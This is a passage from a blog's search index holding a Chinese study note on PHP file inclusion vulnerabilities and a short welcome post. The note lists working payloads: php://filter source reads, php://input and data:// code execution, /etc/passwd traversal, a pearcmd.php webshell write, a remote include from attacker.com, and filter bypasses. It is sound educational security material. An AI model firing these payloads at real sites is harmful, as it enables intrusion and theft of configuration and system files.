        <tags>
            
            <tag> SQL </tag>
            
            <tag> MySQL </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP文件包含漏洞-学习笔记</title>
      <link href="/2026/01/18/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2026/01/18/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>核心结论：PHP文件包含漏洞的本质是「文件包含函数未对用户可控文件名做严格校验」，导致攻击者可通过构造路径&#x2F;伪协议，触发文件读取、代码执行等风险，其触发与底层文件解析逻辑、PHP配置、系统特性强相关。</p><h2 id="一、漏洞基础（源码视角）"><a href="#一、漏洞基础（源码视角）" class="headerlink" title="一、漏洞基础（源码视角）"></a>一、漏洞基础（源码视角）</h2><h3 id="1-核心定义"><a href="#1-核心定义" class="headerlink" title="1. 核心定义"></a>1. 核心定义</h3><p>当PHP代码中使用 <code>include</code>&#x2F;<code>require</code> 等函数，且传入的文件名由用户控制（如 <code>$_GET[&#39;file&#39;]</code>），未经过滤直接拼接路径执行时，攻击者可构造恶意路径，实现「非预期文件包含」，进而泄露源码或执行恶意代码。</p><h3 id="2-关键依赖（php-ini配置）"><a href="#2-关键依赖（php-ini配置）" class="headerlink" title="2. 关键依赖（php.ini配置）"></a>2. 关键依赖（php.ini配置）</h3><p>配置项直接决定漏洞利用范围，源码层面会通过全局变量判断是否允许对应操作：</p><ul><li><code>allow_url_fopen=On</code>（默认开启）：允许从远程服务器读取数据（影响远程文件包含）。</li><li><code>allow_url_include=On</code>（PHP5.2后默认关闭）：允许 <code>include/require</code> 远程文件（远程包含漏洞的核心开关）。</li><li><code>open_basedir</code>：限制PHP可访问的目录树，源码层面会校验文件路径是否在允许范围内，是重要防御配置。</li></ul><h3 id="3-核心函数（源码差异）"><a href="#3-核心函数（源码差异）" class="headerlink" title="3. 核心函数（源码差异）"></a>3. 核心函数（源码差异）</h3><p>PHP文件包含函数的底层实现逻辑决定了其错误处理和重复包含特性：</p><table><thead><tr><th>函数</th><th>源码层面核心差异</th></tr></thead><tbody><tr><td><code>include()</code></td><td>加载失败仅抛出 <code>E_WARNING</code>，脚本继续执行；底层调用 <code>php_stream_open_wrapper</code> 解析路径</td></tr><tr><td><code>require()</code></td><td>加载失败抛出 <code>E_COMPILE_ERROR</code>，脚本终止；解析逻辑与 <code>include</code> 一致</td></tr><tr><td><code>include_once()</code></td><td>先通过 <code>zend_hash</code> 检查文件是否已包含，已包含则跳过；依赖路径解析结果去重</td></tr><tr><td><code>require_once()</code></td><td>错误处理同 <code>require</code>，去重逻辑同 <code>include_once</code></td></tr></tbody></table><h2 id="二、漏洞触发的底层逻辑（源码拆解）"><a href="#二、漏洞触发的底层逻辑（源码拆解）" class="headerlink" title="二、漏洞触发的底层逻辑（源码拆解）"></a>二、漏洞触发的底层逻辑（源码拆解）</h2><p>以最简化漏洞代码为例，分析触发流程：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-路径解析流程（源码核心步骤）"><a href="#1-路径解析流程（源码核心步骤）" class="headerlink" title="1. 路径解析流程（源码核心步骤）"></a>1. 路径解析流程（源码核心步骤）</h3><ol><li>接收用户输入 <code>$_GET[&#39;file&#39;]</code>，未做任何过滤；</li><li>调用底层 <code>php_stream_open_wrapper_ex</code> 函数，解析传入的路径（处理 <code>../</code>、软链接、伪协议等）；</li><li>若路径合法（存在对应文件），读取文件内容并当作PHP代码执行；</li><li>若路径非法（文件不存在），根据函数类型抛出对应错误。</li></ol><h3 id="2-漏洞触发的核心原因"><a href="#2-漏洞触发的核心原因" class="headerlink" title="2. 漏洞触发的核心原因"></a>2. 漏洞触发的核心原因</h3><ul><li>源码未对用户输入做「白名单校验」：未限制仅允许包含指定目录&#x2F;文件；</li><li>未过滤「路径穿越字符」：<code>../</code>、<code>./</code> 等符号未被替换，导致攻击者可跳转至任意目录；</li><li>未拦截「危险伪协议」：<code>php://</code>、<code>zip://</code> 等协议未被禁止，攻击者可构造特殊流触发代码执行。</li></ul><h2 id="三、核心利用方式（源码-实例）"><a href="#三、核心利用方式（源码-实例）" class="headerlink" title="三、核心利用方式（源码+实例）"></a>三、核心利用方式（源码+实例）</h2><h3 id="1-伪协议利用（最常用）"><a href="#1-伪协议利用（最常用）" class="headerlink" title="1. 伪协议利用（最常用）"></a>1. 伪协议利用（最常用）</h3><p>伪协议是PHP内置的IO流，底层通过 <code>php_stream_wrapper</code> 系列函数实现解析，攻击者可利用其特性绕过限制：</p><h4 id="（1）php-filter（源码读取）"><a href="#（1）php-filter（源码读取）" class="headerlink" title="（1）php:&#x2F;&#x2F;filter（源码读取）"></a>（1）php:&#x2F;&#x2F;filter（源码读取）</h4><ul><li>核心逻辑：通过「过滤流」对目标文件进行编码（如base64），避免文件内容直接当作PHP代码执行，进而泄露源码；</li><li>源码层面：<code>convert.base64-encode</code> 过滤器会遍历文件内容，按base64规则编码后输出，不触发代码执行；</li><li>实例：<code>?file=php://filter/read=convert.base64-encode/resource=config.php</code>，解码后获取配置文件源码。</li></ul><h4 id="（2）php-input（代码执行）"><a href="#（2）php-input（代码执行）" class="headerlink" title="（2）php:&#x2F;&#x2F;input（代码执行）"></a>（2）php:&#x2F;&#x2F;input（代码执行）</h4><ul><li>核心逻辑：读取HTTP请求的原始POST数据，若 <code>allow_url_include=On</code>，可将POST数据当作PHP代码执行；</li><li>源码层面：<code>php://input</code> 对应 <code>php_stream_input</code> 流，直接返回POST原始数据，无额外过滤；</li><li>实例：<code>?file=php://input</code>，POST数据传入 <code>&lt;?php system(&#39;id&#39;); ?&gt;</code>，触发命令执行。</li></ul><h4 id="（3）zip-phar-（压缩包包含）"><a href="#（3）zip-phar-（压缩包包含）" class="headerlink" title="（3）zip:&#x2F;&#x2F;&#x2F;phar:&#x2F;&#x2F;（压缩包包含）"></a>（3）zip:&#x2F;&#x2F;&#x2F;phar:&#x2F;&#x2F;（压缩包包含）</h4><ul><li>核心逻辑：底层支持解析压缩包内文件，攻击者可将恶意PHP文件压缩后，通过协议直接包含压缩包内的恶意代码；</li><li>源码层面：<code>zip://</code> 调用 <code>php_stream_zip_open</code> 函数，解析压缩包路径（<code>#</code> 分隔压缩包与内部文件，需URL编码为 <code>%23</code>）；</li><li>实例：<code>?file=zip:///var/www/upload/1.jpg%23shell.php</code>（1.jpg是包含shell.php的压缩包，后缀可伪装）。</li></ul><h4 id="（4）data-（直接执行代码）"><a href="#（4）data-（直接执行代码）" class="headerlink" title="（4）data:&#x2F;&#x2F;（直接执行代码）"></a>（4）data:&#x2F;&#x2F;（直接执行代码）</h4><ul><li>核心逻辑：将数据当作文件内容解析，需 <code>allow_url_fopen</code> 和 <code>allow_url_include</code> 均开启；</li><li>源码层面：<code>data://</code> 流直接读取传入的字符串，按指定编码（如base64）解码后执行；</li><li>实例：<code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code>（base64解码后为 <code>&lt;?php phpinfo(); ?&gt;</code>）。</li></ul><h3 id="2-路径穿越利用（目录跳转）"><a href="#2-路径穿越利用（目录跳转）" class="headerlink" title="2. 路径穿越利用（目录跳转）"></a>2. 路径穿越利用（目录跳转）</h3><ul><li>核心逻辑：利用 <code>../</code>（上级目录）、<code>./</code>（当前目录）字符，绕过源码中「固定路径前缀」的限制；</li><li>源码层面：PHP会调用系统 <code>realpath</code> 函数解析路径，若未过滤 <code>../</code>，则会跳转至任意目录；</li><li>实例：漏洞代码 <code>include &quot;/var/www/html/&quot;.$_GET[&#39;file&#39;];</code>，攻击者构造 <code>?file=../../etc/passwd</code>，最终解析为 <code>/var/www/html/../../etc/passwd</code>，即 <code>/etc/passwd</code>，泄露系统文件。</li></ul><h3 id="3-临时文件包含（竞争条件）"><a href="#3-临时文件包含（竞争条件）" class="headerlink" title="3. 临时文件包含（竞争条件）"></a>3. 临时文件包含（竞争条件）</h3><ul><li>核心逻辑：PHP上传文件&#x2F;处理大请求时，会生成临时文件（如 <code>/tmp/phpXXXXXX</code>），底层会在请求结束后自动删除，攻击者可通过「条件竞争」在删除前包含该文件；</li><li>源码层面：临时文件由 <code>php_stream_fopen_tmpfile</code> 函数创建，文件名由随机字符生成，需通过phpinfo泄露路径或暴力猜解；</li><li>典型场景：<ul><li>上传文件时，临时文件在 <code>/tmp</code> 目录存在短暂窗口期；</li><li><code>session.upload_progress</code> 特性（默认开启）：上传时会将进度信息写入Session文件，可通过条件竞争包含。</li></ul></li></ul><h3 id="4-特殊场景利用（结合系统-PHP特性）"><a href="#4-特殊场景利用（结合系统-PHP特性）" class="headerlink" title="4. 特殊场景利用（结合系统&#x2F;PHP特性）"></a>4. 特殊场景利用（结合系统&#x2F;PHP特性）</h3><h4 id="（1）绕过-include-once-限制（多级软链接）"><a href="#（1）绕过-include-once-限制（多级软链接）" class="headerlink" title="（1）绕过 include_once 限制（多级软链接）"></a>（1）绕过 <code>include_once</code> 限制（多级软链接）</h4><ul><li>源码层面：<code>include_once</code> 依赖「路径去重」，PHP会通过 <code>lstat</code> 函数解析路径，将软链接转换为真实路径；</li><li>利用逻辑：当软链接跳转次数超过Linux <code>lstat</code> 函数的递归上限（默认约20次），解析会失败，导致真实路径与记录路径不一致，从而绕过去重；</li><li>实例：<code>?file=/proc/self/root/proc/self/root/.../www/config.php</code>（重复20+次 <code>/proc/self/root</code>，最终解析路径与原始路径不同）。</li></ul><h4 id="（2）Windows通配符利用"><a href="#（2）Windows通配符利用" class="headerlink" title="（2）Windows通配符利用"></a>（2）Windows通配符利用</h4><ul><li>核心逻辑：PHP在Windows下调用 <code>FindFirstFileExW</code> API解析文件，该API支持特殊通配符（<code>&lt;?</code> 匹配0+字符、<code>&gt;</code> 匹配1字符）；</li><li>源码层面：未过滤通配符，攻击者可通过 <code>C:\Windows\Temp\php&lt;&lt;</code> 匹配临时文件名（<code>php</code> 后接随机字符）；</li><li>实例：上传文件后，构造 <code>?file=C:\Windows\Temp\php&lt;&lt;</code>，包含临时文件中的恶意代码。</li></ul><h4 id="（3）Docker环境（pearcmd-php利用）"><a href="#（3）Docker环境（pearcmd-php利用）" class="headerlink" title="（3）Docker环境（pearcmd.php利用）"></a>（3）Docker环境（pearcmd.php利用）</h4><ul><li>源码层面：Docker默认安装PEAR，<code>pearcmd.php</code> 路径固定（<code>/usr/local/lib/php/pearcmd.php</code>），且开启 <code>register_argc_argv</code> 时，可通过query-string控制命令行参数；</li><li>利用逻辑：<code>pearcmd.php</code> 的 <code>config-create</code> 命令支持写入文件，攻击者通过包含该文件，构造参数写入恶意代码；</li><li>实例：<code>?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?php system(&#39;id&#39;);?&gt;+/tmp/shell.php</code>。</li></ul><h2 id="四、常见绕过技巧（源码-底层逻辑）"><a href="#四、常见绕过技巧（源码-底层逻辑）" class="headerlink" title="四、常见绕过技巧（源码&#x2F;底层逻辑）"></a>四、常见绕过技巧（源码&#x2F;底层逻辑）</h2><h3 id="1-路径过滤绕过"><a href="#1-路径过滤绕过" class="headerlink" title="1. 路径过滤绕过"></a>1. 路径过滤绕过</h3><ul><li>编码绕过：<code>../</code> 编码为 <code>%2e%2e%2f</code>（URL编码）、<code>%252e%252e%252f</code>（二次编码），源码层面解码后还原；</li><li>容器特性：Apache Tomcat支持 <code>..%c0%af</code> 解析为 <code>../</code>，底层编码解析逻辑差异导致；</li><li>长度截断：PHP&lt;5.2.8时，Windows路径最大256字节、Linux最大4096字节，重复 <code>./</code> 超出长度后，后缀会被丢弃（如 <code>?file=shell.php./././...</code>）。</li></ul><h3 id="2-后缀限制绕过"><a href="#2-后缀限制绕过" class="headerlink" title="2. 后缀限制绕过"></a>2. 后缀限制绕过</h3><ul><li><code>%00</code> 截断：PHP&lt;5.3.4且 <code>magic_quotes_gpc=Off</code> 时，源码层面遇到 <code>%00</code>（null字节）会停止解析，如 <code>?file=shell.php%00.txt</code> 截断后缀 <code>.txt</code>；</li><li>协议绕过：利用 <code>zip://</code>&#x2F;<code>phar://</code>，后缀拼接不影响协议解析（如 <code>?file=zip://test.jpg%23shell.php.txt</code>）；</li><li>URL片段：<code>?file=http://attacker.com/shell.php%23.txt</code>，<code>#</code> 后内容为URL片段，源码层面解析时忽略。</li></ul><h3 id="3-伪协议拦截绕过"><a href="#3-伪协议拦截绕过" class="headerlink" title="3. 伪协议拦截绕过"></a>3. 伪协议拦截绕过</h3><ul><li>大小写混淆：<code>PhP://FiLtEr</code>，源码层面协议解析不区分大小写；</li><li>协议变种：<code>php://filter/|convert.base64-decode/resource=config.php</code>，通过过滤器组合绕过简单字符串拦截。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Web安全 </tag>
            
            <tag> 安全 </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>欢迎来到我的博客</title>
      <link href="/2026/01/17/hello-blog/"/>
      <url>/2026/01/17/hello-blog/</url>
      
        <content type="html"><![CDATA[<h2 id="你好，世界！"><a href="#你好，世界！" class="headerlink" title="你好，世界！"></a>你好，世界！</h2><p>欢迎来到我的个人博客 Wblog。这是我的第一篇文章。</p><h3 id="关于这个博客"><a href="#关于这个博客" class="headerlink" title="关于这个博客"></a>关于这个博客</h3><p>这个博客使用 Hexo 搭建，托管在 GitHub Pages 上。我会在这里分享：</p><ul><li>技术学习笔记</li><li>生活感悟</li><li>读书心得</li><li>项目经验</li></ul><h3 id="终身学习"><a href="#终身学习" class="headerlink" title="终身学习"></a>终身学习</h3><p>正如博客的描述所说，我相信终身学习的力量。在这个快速变化的时代，保持学习的热情和好奇心是最重要的。</p><p>希望通过这个博客，记录自己的成长轨迹，也能与大家交流分享。</p><span id="more"></span><h3 id="未来计划"><a href="#未来计划" class="headerlink" title="未来计划"></a>未来计划</h3><p>接下来我会持续更新博客内容，主要方向包括：</p><ol><li><strong>技术文章</strong> - 编程语言、框架、工具使用心得</li><li><strong>项目实践</strong> - 实际项目中遇到的问题和解决方案</li><li><strong>学习笔记</strong> - 读书笔记、课程总结</li><li><strong>思考感悟</strong> - 对技术、生活的思考</li></ol><h3 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h3><p>如果你对我的文章有任何想法或建议，欢迎通过以下方式联系我：</p><ul><li>GitHub: <a href="https://github.com/xionglinxin">linxin</a></li><li>Email: <a href="mailto:&#50;&#x34;&#x32;&#x35;&#x37;&#51;&#x35;&#56;&#53;&#x32;&#x40;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#50;&#x34;&#x32;&#x35;&#x37;&#51;&#x35;&#56;&#53;&#x32;&#x40;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;</a></li></ul><p>让我们一起在学习的道路上前行！</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
            <tag> 开始 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
